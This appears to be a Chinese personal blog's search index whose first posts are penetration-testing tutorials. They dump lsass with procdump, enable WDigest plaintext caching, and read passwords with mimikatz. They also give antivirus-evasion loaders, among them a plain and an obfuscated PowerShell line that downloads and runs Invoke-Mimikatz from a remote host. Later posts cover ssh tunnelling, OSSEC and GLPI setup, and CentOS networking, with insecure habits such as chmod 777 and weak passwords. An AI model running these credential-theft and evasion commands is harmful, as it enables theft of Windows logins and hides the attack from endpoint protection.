<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Windows10明文密码抓取]]></title>
    <url>%2Fposts%2Fb500df40.html%2F</url>
    <content type="text"><![CDATA[桃李春风一杯酒，江湖夜雨十年灯 在默认情况下，当系统为win10时，系统默认在内存缓存中是禁止保存明文密码，所以要想使用mimikatz抓取明文账号密码，还得重新配置注册表并重登系统才能抓取明文。procdump+mimikatz获取win10用户明文密码测试环境：Win10 企业版LTSC 1809工具下载：k8版本的mz64.exe、procdumpv9.0原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中抓取明文：修改注册表，等待系统重新登录，截取dmp文件先修改注册表1reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f 修改完之后，重新登录账号，此时抓出来的密码就是明文显示。 在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，如下图，密码字段显示为null，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。重登系统后，抓取dmp文件管理员权限运行1procdump64.exe -accepteula -ma lsass.exe 1.dmp也可以在任务管理器中导出文件，这里需要注意AppData隐藏文件夹把dmp文件导出到本地使用mimikatz读取密码 我这里是直接在机器上运行mimikatz读取密码了，在实际运用中一般会导出到本地再读取密码，这样才能躲避杀软检测流量特征。对了，这里需要注意的是，一开始我是用官方2.2.0、2.1.1版本的mz通通报错，google发现这应该是跟mz版本还有win10版本有关。1mz64.exe "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit这里我用了k8的mz才没有报错，成功读出win10的明文密码]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
        <tag>内网渗透</tag>
        <tag>Windows</tag>
        <tag>密码抓取</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[几种姿势运行mimikatz]]></title>
    <url>%2Fposts%2Fb80a3101.html%2F</url>
    <content type="text"><![CDATA[醉后不知天在水，满船清梦压星河 [Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)是一款能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的神器，内网渗透中常用mimikatz获取明文密码或者获取hash值来漫游内网。但是在实际的运用中，常常会遇到杀软的拦截，所以这里我借鉴网上的资料，进行复现学习，达到免杀绕过的目的。有些方式没有复现成功我就没有写出来了，有一些成功之后似乎也会被拦截了。姿势一：powershell1https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1cmd下执行，360没有拦截1powershell -exec bypass "import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz"powershell运行会被拦截1powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.30.139/Invoke-Mimikatz.ps1');Invoke-Mimikatz简单混淆还是被拦截了1powershell -c " ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.30'+'.139/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"姿势二：使用.net2.0免杀mimikatz首先下载katz.cs，并放在对应的系统版本的Framework目录中1232位：C:\Windows\Microsoft.NET\Framework\v2.0.5072764位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727然后在powershell中执行命令生成key.snk123$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='$Content = [System.Convert]::FromBase64String($key)Set-Content key.snk -Value $Content -Encoding Byte最后生成mimikatz，再运行32位：1C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe64位：1C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe很不幸，又被360发现了然而，火绒又过了，没有一点提示姿势三：js加载mimikatz下载katz.js，执行1cscript mimikatz.js360拦截，但是火绒过了，没有反应姿势四：.net4.0加载mimikatz下载mimikatz.xml，执行12cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319msbuild.exe mimikatz.xml过360，并没有拦截火绒同样没报姿势五：Jscript的xsl版下载mimikatz.xsl本地加载1wmic os get /format:"mimikatz.xsl"360、火绒都没有拦截姿势六：导出lsass进程离线读取密码mimikatz+procdump下载prodump，管理员权限运行1procdump64.exe -accepteula -ma lsass.exe 1.dmp也可以在任务管理器中导出文件然后把dmp文件导出到本地使用mimikatz读取密码1mz64.exe "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit这里需要注意的是win10下的密码抓取方式是不太一样的，具体看另一篇文章：Windows10明文密码抓取。win7下拿到dmp文件后，就可以导出读取明文密码。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>mimikatz</tag>
        <tag>内网渗透</tag>
        <tag>Windows</tag>
        <tag>密码抓取</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7虚拟机克隆的网络问题]]></title>
    <url>%2Fposts%2F2e7f84f8.html%2F</url>
    <content type="text"><![CDATA[壮心未与年俱老，死去犹能作鬼雄 今天克隆了centos7虚拟机，打开却发现一直没有网卡信息，后来才想起克隆会造成网卡信息的冲突，得手动进行修改才能获取ip，所以记录一下避免以后重走老路浪费时间。遇到的问题打开克隆好的虚拟机，查看网卡信息发现没有IP，对了，我这里的虚拟机是双网卡解决方法1、进入/etc/udev/rules.d/这个目录，删除文件70-persistent-ipoib.rules12[root@Centos ~]# cd /etc/udev/rules.d/[root@Centos rules.d]# rm -f 70-persistent-ipoib.rules2、修改网卡配置文件/etc/sysconfig/network-scripts/ifcfg-ens33，这里具体看大家的网卡名字，我的是ens33删除UUID这一行，因为每张网卡的mac地址是不一样的，所以UUID也是不一样的修改HWADDR为虚拟机克隆后的MAC地址 ip addr可以看到mac地址，但是还没修改网卡配置信息之前，这里是不能看到具体的ens33、37显示，只能看到类似于下方显示的virbr0名字3、然后如法炮制，copy一份修改好的ens33配置文件，修改为另外一块网卡正确的mac地址1[root@Centos network-scripts]# cp ifcfg-ens33 ifcfg-ens37我这里看到的名字是ens37，所以我得复制为ens37，然后再修改相应的mac和name4、最后重启一下网络服务，再检查一下IP信息就ok了1[root@Centos ~]# systemctl restart network.service注意如果启动网络服务时出现Device eno16884287 does not seem to be present错误修改网卡配置文件/etc/sysconfig/network-scripts/ifcfg-eno16884287, 修改Device和Name的名称， 如修改为“eth33”；确认网卡配置文件中“HWADDR”虚拟机的MAC地址是否正确；将网卡配置文件名重命名为/etc/sysconfig/network-scripts/ifcfg-eth33。1[root@Centos network-scripts]# mv ifcfg-eno16884287 ifcfg-eth33如果启动网络服务时出现Error, some other host already use address错误出现该错误说明同一个网段中有主机已经占用该虚拟主机配置的IP地址， 需要重新配置一个尚未使用的IP地址。]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>网卡</tag>
        <tag>Centos7</tag>
        <tag>克隆</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cenotos7搭建部署OSSEC-server+agent]]></title>
    <url>%2Fposts%2Fd1ee79fb.html%2F</url>
    <content type="text"><![CDATA[大鹏一日同风起，扶摇直上九万里 OSSEC是一款开源的基于主机的入侵检测系统，可以简称为HIDS。它具备日志分析，文件完整性检查，策略监控，rootkit检测，实时报警以及联动响应等功能。它支持多种操作系统：Linux、Windows、MacOS、Solaris、HP-UX、AIX。属于企业安全之利器。OSSEC简介 OSSEC是一款开源的多平台的入侵检测系统，可以运行于Windows、Linux、OpenBSD/FreeBSD、以及 MacOS等操作系统中。主要功能有日志分析、完整性检查、rootkit检测、基于时间的警报和主动响应。除了具有入侵检测系统功能外，它还一般被用在SEM/SIM（安全事件管理SEM： Security Event Management)/（安全信息管理SIM：SecurityInformation Management）解决方案中。因其强大的日志分析引擎，ISP（网络服务提供商Internet service provider）、大学和数据中心用其监控和分析他们的防火墙、入侵检测系统、网页服务和验证等产生的日志。前提环境准备 首先我们安装需要用到的关联库和软件，由于我们最终是需要把日志导入到MySQL中进行分析，以及需要通过web程序对报警结果进行展示，同时需要把本机当做SMTP，所以需要在本机安装MySQL、Apache和sendmail服务。在当前的终端中执行如下命令：1yum install wget gcc make mysql mysql-server mysql-devel httpd php php-mysql sendmail启动httpd、mysql、sendmail服务1for i in &#123;httpd,mysqld,sendmail&#125;; do service $i restart; done创建数据库方面后面的安装配置，连接到本机的MySQL，然后执行1234567mysql -uroot -pmysql&gt; create database ossec;mysql&gt; CREATE USER 'ossec'@'localhost';mysql&gt; grant INSERT,SELECT,UPDATE,CREATE,DELETE,EXECUTE on ossec.* to ossec@localhost;mysql&gt; set password for ossec@localhost =PASSWORD('ossec');mysql&gt; flush privileges;mysql&gt; exit 这里使用的是比较简单的密码，MySQL5.6.6版本之后增加了密码强度验证插件validate_password，相关参数设置的较为严格。使用了该插件会检查设置的密码是否符合当前设置的强度规则，若不满足则拒绝设置。所以需要修改密码强度的验证机制：1） 查看mysql全局参数配置这里与mysql的validate_password_policy的值有关查看一下msyql密码相关的几个全局参数：123456789101112131415161718192021mysql&gt; select @@validate_password_policy;+----------------------------+| @@validate_password_policy |+----------------------------+| MEDIUM |+----------------------------+1 row in set (0.00 sec)mysql&gt; SHOW VARIABLES LIKE 'validate_password%';+--------------------------------------+--------+| Variable_name | Value |+--------------------------------------+--------+| validate_password_dictionary_file | || validate_password_length | 8 || validate_password_mixed_case_count | 1 || validate_password_number_count | 1 || validate_password_policy | MEDIUM || validate_password_special_char_count | 1 |+--------------------------------------+--------+6 rows in set (0.08 sec)2）参数解释validate_password_dictionary_file插件用于验证密码强度的字典文件路径validate_password_length密码最小长度，参数默认为8，它有最小值的限制，最小值为：validate_password_number_count + validate_password_special_char_count + (2 * validate_password_mixed_case_count)validate_password_mixed_case_count密码至少要包含的小写字母个数和大写字母个数validate_password_number_count密码至少要包含的数字个数validate_password_policy密码强度检查等级，0/LOW、1/MEDIUM、2/STRONG。有以下取值：Policy Tests Performed0 or LOW Length1 or MEDIUM Length; numeric, lowercase/uppercase, and special characters2 or STRONG Length; numeric, lowercase/uppercase, and special characters; dictionary file默认是1，即MEDIUM，所以刚开始设置的密码必须符合长度，且必须含有数字，小写或大写字母，特殊字符validate_password_special_char_count密码至少要包含的特殊字符数3）修改mysql参数配置1234567891011121314151617181920212223242526272829mysql&gt; set global validate_password_policy=0;Query OK, 0 rows affected (0.05 sec)mysql&gt; mysql&gt; mysql&gt; set global validate_password_mixed_case_count=0;Query OK, 0 rows affected (0.00 sec)mysql&gt; set global validate_password_number_count=0;Query OK, 0 rows affected (0.00 sec)mysql&gt; set global validate_password_special_char_count=0;Query OK, 0 rows affected (0.00 sec)mysql&gt; set global validate_password_length=0;Query OK, 0 rows affected (0.00 sec)mysql&gt; SHOW VARIABLES LIKE 'validate_password%';+--------------------------------------+-------+| Variable_name | Value |+--------------------------------------+-------+| validate_password_dictionary_file | || validate_password_length | 0 || validate_password_mixed_case_count | 0 || validate_password_number_count | 0 || validate_password_policy | LOW || validate_password_special_char_count | 0 |+--------------------------------------+-------+6 rows in set (0.00 sec)4）修改简单密码12mysql&gt; SET PASSWORD FOR 'ossec'@'localhost' = PASSWORD('ossec');Query OK, 0 rows affected, 1 warning (0.00 sec)ossec-server安装在官网下载目前最稳定的版本v3.3.0(https://github.com/ossec/ossec-hids/archive/3.3.0.tar.gz)123wget https://github.com/ossec/ossec-hids/archive/2.8.1.tar.gztar zxf 2.8.1.tar.gzcd ossec-hids-2.8.1为了使ossec支持mysql，这里还需要在安装前执行一下命令：1cd src; make setdb; cd .. （一开始装的是目前最稳定的3.3.0版本，但是make不支持mysql，一直报错：make: *** 没有规则可以创建目标“setdb”。 停止。查阅文档发现从3.0.0版本开始，编译方式不一样，也参考过使用make TARGET=server DATABASE=mysql install，但是还是会提示OSSEC not compiled with support for ‘mysql’，只能用回2.8.1的版本） 进入安装步骤，执行install.sh脚本，同时按照下面的信息进行填写，红色部分是我们需要输入的，其余部分按回车继续即可：1- 您希望哪一种安装 (server, agent, local or help)? server选择了 Server 类型的安装.2- 正在初始化安装环境.请选择 OSSEC HIDS 的安装路径 [/var/ossec]:/var/ossecOSSEC HIDS 将安装在 /var/ossec .3- 正在配置 OSSEC HIDS.3.1- 您希望收到e-mail告警吗? (y/n) [y]: y请输入您的 e-mail 地址? *@.com我们找到您的 SMTP 服务器为: alt1.gmail-smtp-in.l.google.com.您希望使用它吗? (y/n) [y]: n请输入您的 SMTP 服务器IP或主机名 ? 127.0.0.13.2- 您希望运行系统完整性检测模块吗? (y/n) [y]: y系统完整性检测模块将被部署.3.3- 您希望运行 rootkit检测吗? (y/n) [y]: yrootkit检测将被部署.3.4- 关联响应允许您在分析已接收事件的基础上执行一个已定义的命令.例如,你可以阻止某个IP地址的访问或禁止某个用户的访问权限.更多的信息,您可以访问:http://www.ossec.net/en/manual.html#active-response您希望开启联动(active response)功能吗? (y/n) [y]: y关联响应已开启默认情况下, 我们开启了主机拒绝和防火墙拒绝两种响应.第一种情况将添加一个主机到 /etc/hosts.deny.第二种情况将在iptables(linux)或ipfilter(Solaris,FreeBSD 或 NetBSD）中拒绝该主机的访问.该功能可以用以阻止 SSHD 暴力攻击, 端口扫描和其他一些形式的攻击. 同样你也可以将他们添加到其他地方,例如将他们添加为 snort 的事件.您希望开启防火墙联动(firewall-drop)功能吗? (y/n) [y]: y防火墙联动(firewall-drop)当事件级别 &gt;= 6 时被启动联动功能默认的白名单是:192.168.30.1您希望添加更多的IP到白名单吗? (y/n)? [n]: y请输入IP (用空格进行分隔): 192.168.30.1303.5- 您希望接收远程机器syslog吗 (port 514 udp)? (y/n) [y]: y远程机器syslog将被接收.3.6- 设置配置文件以分析一下日志:– /var/log/messages– /var/log/secure– /var/log/maillog-如果你希望监控其他文件, 只需要在配置文件ossec.conf中添加新的一项.任何关于配置的疑问您都可以在 http://www.ossec.net 找到答案.— 按 ENTER 以继续 —4- 正在安装系统-正在运行MakefileINFO: Little endian set.…………省略编译输出…………系统类型是 Redhat Linux.修改启动脚本使 OSSEC HIDS 在系统启动时自动运行已正确完成系统配置.要启动 OSSEC HIDS:/var/ossec/bin/ossec-control start要停止 OSSEC HIDS:/var/ossec/bin/ossec-control stop要查看或修改系统配置,请编辑 /var/ossec/etc/ossec.conf感谢使用 OSSEC HIDS.如果您有任何疑问,建议或您找到任何bug,[email protected] 或邮件列表 [email protected] 联系我们.( http://www.ossec.net/en/mailing_lists.html ).您可以在 http://www.ossec.net 获得更多信息— 请按 ENTER 结束安装 (下面可能有更多信息). —直到碰到上面内容，说明安装完成。ossec-server配置安装好服务端之后，还需要配置，执行下面命令启用数据库支持：1[root@Centos ossec-hids-2.8.1]# /var/ossec/bin/ossec-control enable database然后导入MySQL表结构到MySQL中：1[root@Centos ossec-hids-2.8.1]# mysql -u ossec -p ossec &lt; ./src/os_dbd/mysql.schema修改部分配置文件的权限，否则会启动服务失败：1[root@Centos ossec-hids-2.8.1]# chmod u+w /var/ossec/etc/ossec.conf编辑ossec.conf文件，在ossec_config文件中添加mysql配置123456789&lt;ossec_config&gt; &lt;database_output&gt; &lt;hostname&gt;192.168.30.130&lt;/hostname&gt; &lt;username&gt;ossec&lt;/username&gt; &lt;password&gt;ossec&lt;/password&gt; &lt;database&gt;ossec&lt;/database&gt; &lt;type&gt;mysql&lt;/type&gt; &lt;/database_output&gt;&lt;/ossec_config&gt; 在前面的安装过程中支持接受远程机器的syslog，所以我们还需要对ossec.conf文件中的syslog部分进行配置，修改ossec.conf文件，按照下面的内容进行修改，把我们的网段全添加进去：1234&lt;remote&gt; &lt;connection&gt;syslog&lt;/connection&gt; &lt;allowed-ips&gt;192.168.0.0/16&lt;/allowed-ips&gt;&lt;/remote&gt;重启ossec服务进行生效1[root@Centos ossec-hids-2.8.1]# /var/ossec/bin/ossec-control restart添加ossec客户端并导出Key在服务器上添加客户端，执行如下命令，按照提示进行输入，红色部分是我们输入的：1[root@Centos ossec-hids-2.8.1]# /var/ossec/bin/manage_agentsKey的作用是在客户端中导入并使得服务端与客户端达到联动的效果，这里记得把密钥复制一下保存起来。查看ossec服务端的状态1/var/ossec/bin/agent_control -lcossec-agent安装这里安装的方式跟上面server安装方式是一样的，然后执行./install.sh稍等一会就会看到安装成功的提示ossec-agent配置linux把刚刚生成的key导入到客户端中1root@Ubuntu:~/ossec-hids-2.8.1# ./bin/manage_agents启动客户端1root@Ubuntu:~/ossec-hids-2.8.1# /var/ossec/bin/ossec-control startwindows下载客户端exe:https://bintray.com/artifact/download/ossec/ossec-hids/ossec-agent-win64-2.8.1.exe或者https://bintray.com/artifact/download/ossec/ossec-hids/ossec-agent-win32-2.8.1.exe然后默认安装注意：运行时要以管理员权限运行，然后粘贴你复制下来的秘钥最后别忘了运行一下安装第三方的web界面（ossec-wui 或 analogi）12345wget -O /var/www/html/ossec-wui-0.9.tar.gz https://github.com/ossec/ossec-wui/archive/0.9.tar.gztar -xzf ossec-wui-0.9.tar.gzmv ossec-wui-0.9 osseccd ossec./setup.sh对ossec.config进行配置，添加虚拟目录1vim /etc/httpd/conf.d/ossec.conf1234567Alias ossec/ "/var/www/html/ossec/"&lt;Directory "/var/www/html/ossec/"&gt;AuthName "OSSEC AUTH"Require valid-userAuthType BasicAuthUserFile /var/www/html/ossec/.htpasswd&lt;/Directory&gt;重启apache1service httpd restart重启完就可以看到web的界面了这里一开始遇到了报错，提示ossec目录没有权限，别忘了需要对ossec授权1chmod -R 777 /var/ossec/]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Centos7</tag>
        <tag>OSSEC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh反向代理实现内网端口转发]]></title>
    <url>%2Fposts%2F60506580.html%2F</url>
    <content type="text"><![CDATA[读书不觉已春深，一寸光阴一寸金 为了安全起见，公司或者是学校的服务器一般只允许用户在局域网内登录，离开内网环境后就没法登录服务器，特别不方便。但是在某些情况下，我们又想和服务器进行通信的话，就需要借助端口转发来达到目的。 ssh是一种安全的传输协议，通常我们会用在连接服务器上比较多。不过除了这个功能以外，ssh的隧道转发功能更吸引人。ssh常用命令参数-C 请求压缩所有数据-f 告诉ssh客户端在后台运行-N 告诉ssh客户端，这个连接不需要执行任何命令，仅仅做端口转发-g 默认这个LocalPort端口只允许本机连接，可以通过这个参数允许别的机器连接这个端口ssh三种代理功能正向代理（-L）：相当于 iptable 的 port forwarding反向代理（-R）：相当于 frp 或者 ngroksocks5 代理（-D）：相当于 ss/ssr123ssh -C -f -N -g -L listen_port:DST_Host:DST_port user@Tunnel_Host ssh -C -f -N -g -R listen_port:DST_Host:DST_port user@Tunnel_Host ssh -C -f -N -g -D listen_port user@Tunnel_Host正向代理-L port:host:hostport 将本地主机(客户机)的某个端口转发到远端指定机器的指定端口 本地机器上分配了一个 socket 侦听 port 端口， 一旦这个端口上有了连接，该连接就经过安全通道转发出去，同时远程主机和 host 的 hostport 端口建立连接。可以在配置文件中指定端口的转发。只有 root 才能转发特权端口。IPv6 地址用另一种格式说明：port/host/hostport用法1：远程端口映射到其他机器HostB 上启动一个 PortB 端口，映射到 HostC:PortC 上，在 HostB 上运行：1ssh -L 0.0.0.0:PortB:HostC:PortC user@HostC这时访问 HostB:PortB 相当于访问 HostC:PortC用法2：本地端口通过跳板机映射到其他机器HostA 上启动一个 PortA 端口，通过 HostB 转发到 HostC:PortC上，在 HostA 上运行：1ssh -L 0.0.0.0:PortA:HostC:PortC user@HostB这时访问 HostA:PortA 相当于访问 HostC:PortC 两种用法的区别是，第一种用法本地到跳板机 HostB 的数据是明文的，而第二种用法一般本地就是 HostA，访问本地的 PortA，数据被 ssh 加密传输给 HostB 又转发给 HostC:PortC。反向代理-R port:host:hostport 将远程主机(服务器)的某个端口转发到本地指定机器的指定端口 远程主机上分配了一个 socket 侦听 port 端口，一旦这个端口上有了连接，该连接就经过安全通道转向出去，同时本地主机和 host 的 hostport 端口建立连接。可以在配置文件中指定端口的转发。只有用 root 登录远程主机才能转发特权端口。IPv6 地址用另一种格式说明：port/host/hostportHostA 将自己可以访问的 HostB:PortB 暴露给外网服务器 HostC:PortC，在 HostA 上运行：1ssh -R HostC:PortC:HostB:PortB user@HostC这时访问 HostC:PortC 就相当于访问 HostB:PortB使用时需修改 HostC 的 /etc/ssh/sshd_config，添加：1GatewayPorts yes 相当于内网穿透，比如 HostA 和 HostB 是同一个内网下的两台可以互相访问的机器，HostC是外网跳板机，HostC不能访问 HostA，但是 HostA 可以访问 HostC。 那么通过在内网 HostA 上运行 ssh -R 告诉 HostC，创建 PortC 端口监听，把该端口所有数据转发给我（HostA），我会再转发给同一个内网下的 HostB:PortB。 同内网下的 HostA/HostB 也可以是同一台机器，换句话说就是内网 HostA 把自己可以访问的端口转发给了外网 HostC。本地socks5代理-D port 动态端口转发 本地机器上分配了一个 socket 侦听 port 端口，一旦这个端口上有了连接，该连接就经过安全通道转发出去，根据应用程序的协议可以判断出远程主机将和哪里连接。目前支持 SOCKS4 协议，将充当 SOCKS4 服务器。只有 root 才能转发特权端口。可以在配置文件中指定动态端口的转发。 在 HostA 的本地 1080 端口启动一个 socks5 服务，通过本地 socks5 代理的数据会通过 ssh 链接先发送给 HostB，再从 HostB 转发送给远程主机：1ssh -D localhost:1080 HostB 那么在 HostA 上面，浏览器配置 socks5 代理为 127.0.0.1:1080，看网页时就能把数据通过 HostB 代理出去，类似 ss/ssr 版本，只不过用 ssh 来实现。虚拟机实践 这是我在虚拟机模拟的环境，假设公司内网有B机器和C机器，B机器能上外网，C机器是内网的web服务器，不能上外网，只能在内网被访问。此时我在外网想使用A机器连接到B机器，那只能反向代理，把C的端口流量转发给B，再用A去访问B。启动远程服务器ssh的路由功能。在/etc/ssh/sshd_config中修改123GatewayPorts no 为 GatewayPorts yesAllowAgentForwarding yesAllowTcpForwarding yes注意需要重启sshd服务systemctl sshd restart 如果不打开这个的话，只能在远程服务器上进行内网穿透。如果不行的话可以将被映射的端口绑定在0.0.0.0的接口上，方法是ssh加上参数-b 0.0.0.0。在内网服务器上进行端口转发，并输入远程服务器的密码1ssh -fR 5555:127.0.0.1:22 root@192.168.30.131 -p 22 "vmstat 30" ssh -fR 远程服务器开放的端口:127.0.0.1:内网服务器SSH端口 root@远程服务器IP -p 远程服务器SSH端口 “vmstat 30” -f 表示后台运行 -R表示远程端口转发 vmstat 30 是为了防止远程服务器把长时间没有通讯的链接断开。远程登录内网服务器1ssh -v -R 192.168.30.131:5555:192.168.20.129:22 root@192.168.30.130]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>端口转发</tag>
        <tag>ssh</tag>
        <tag>远程登陆</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos7搭建GLPI+fusioninventory资产管理系统]]></title>
    <url>%2Fposts%2Ffbd82d13.html%2F</url>
    <content type="text"><![CDATA[乱山残雪夜，孤烛异乡人 资产管理系统是用于帮助管理员管理和跟踪网络中计算机及网络设备的资产信息的软件，根据具体配置可以获取到资产的详细的软硬件信息及应用软件的安装下载情况。GLPI简介 GLPI是法语Gestionnaire libre de parc informatique的缩写，是一款历史悠久的资产管理软件，他提供功能全面的IT资源管理接口，可以用来建立数据库来全面管理IT部门的电脑、显示器、服务器、打印机、网络设备、电话等多种资产信息，同时也提供文档、知识库、工单、合同、供应商、联系人等其他管理功能。安装GLPI环境搭建：centos7+apache+PHP5.6+MySQL5.7（关闭防火墙和selinux）、GLPI版本：9.4.4GLPI是一个web应用服务器，所以需要：网络服务器PHP数据库先把镜像源换为国内的源备份1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup下载新的CentOS-Base.repo到/etc/yum.repos.d/1wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo生成缓存1yum makecache配置yum源123yum install epel-release -yrpm -Uvh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm安装php1yum install --enablerepo=remi --enablerepo=remi-php56 php php-opcache php-devel php-mbstring php-mcrypt php-mysqlnd php-phpuni-PHPUnit php-pecl-xdebug php-pecl-xhprof php-imap php-gd php-ldap安装LAMP1yum -y install gcc gcc-c++ gcc-g77 flex bison autoconf automake bzip2-devel zlib-devel ncurses-devel libjpeg-devel libpng-devel libtiff-devel freetype-devel pam-devel openssl-devel libxml2-devel gettext-devel pcre-devel mysql mysql-server httpd安装Mysql5.71234567891011121314151617181920212223wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm #下载yum localinstall mysql57-community-release-el7-11.noarch.rpm #安装mysql源yum repolist enabled | grep "mysql.*-community.*" #检查是否安装成功yum install -y mysql-community-server #安装systemctl start mysqld #启动systemctl status mysqld #查看状态systemctl enable mysql #开机自启systemctl daemon-reload #重载所有修改过的配置文件grep 'temporary password' /var/log/mysqld.log #默认密码在/var/log/mysqld.log中mysql -uroot -p #启动set password for 'root'@'localhost'=password('MyNewPass4!'); #设置新的密码flush privileges #刷新MySQL的系统权限相关表安装GLPI9.4.4安装包下载地址：https://github.com/glpi-project/glpi/releases1234567891011https://github.com/glpi-project/glpi/releases/download/9.4.4/glpi-9.4.4.tgz #下载wgettar -zxvf glpi-9.4.4.tgz -C /var/www/html #解压chown -R apache:apache /var/www/htmlchmod 755 -R /var/www/html/glpi/config/chmod 755 -R /var/www/html/glpi/files/systemctl start httpd浏览器中输入ip/glpi可能出现的问题提示“检查日志文件的写入权限”提示文件无法创建”，则需要修改glpi目录下的config和files文件夹：12345cd /var/www/html/glpisudo chmod 777 configsudo chmod 777 -R files提示“对文件目录的Web访问被保护”，则需要修改apache配置：修改apache的配置文件/etc/httpd/conf/httpd.conf12345678910111213141516&lt;Directory /&gt;Options FollowSymLinksAllowOverride NoneRequire all denied&lt;/Directory&gt;&lt;Directory /usr/share&gt;AllowOverride NoneRequire all granted&lt;/Directory&gt;&lt;Directory /var/www/&gt;Options Indexes FollowSymLinksAllowOverride NoneRequire all granted&lt;/Directory&gt;把None修改为all，然后重启一下httpd服务安装fusioninventory插件点击查看插件目录，可看到能装在GLPI里的所有插件这里选择fusioninventory此插件安装包下载地址：https://github.com/fusioninventory/fusioninventory-for-glpi/releases这里需要注意的是fusioninventory的版本一定要和GLPI的版本一致，例如我刚安装的GLPI版本是9.4.4的，这里的fusioninventory的版本也得是9.4.4的将插件包解压到GLPI的plugins目录中解压之后记得给权限12chown apache:apache -R /var/www/html/glpi/plugins/fusioninventorychmod 775 -R /var/www/html/glpi/plugins/fusioninventory此时再次刷新web界面就能看到fusion inventory插件了，点击安装、启用可能出现的问题GLPI里打开FusionInventory插件界面，显示无法运行，提示“GLPI cron not running”：原因：没有添加计划任务设置定时任务：1crontab -e在打开的文件里键入：1* * * * * /usr/bin/php /var/www/glpi/front/cron.php &amp;&gt;/dev/null保存，退出有时候插件的这个错误莫名其妙地突然出现，比如在导入数据库之后，而且设置定时任务没有效果。即使是定时任务，其中的指令也只是普通指令，所以我们可以手动执行之，即在终端直接执行：1/usr/bin/php /var/www/html/glpi/front/cron.php小白一个，如有错误，欢迎指出！]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Centos7</tag>
        <tag>GLPI</tag>
        <tag>fusioninventory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OSI网络七层协议]]></title>
    <url>%2Fposts%2F8961bf5e.html%2F</url>
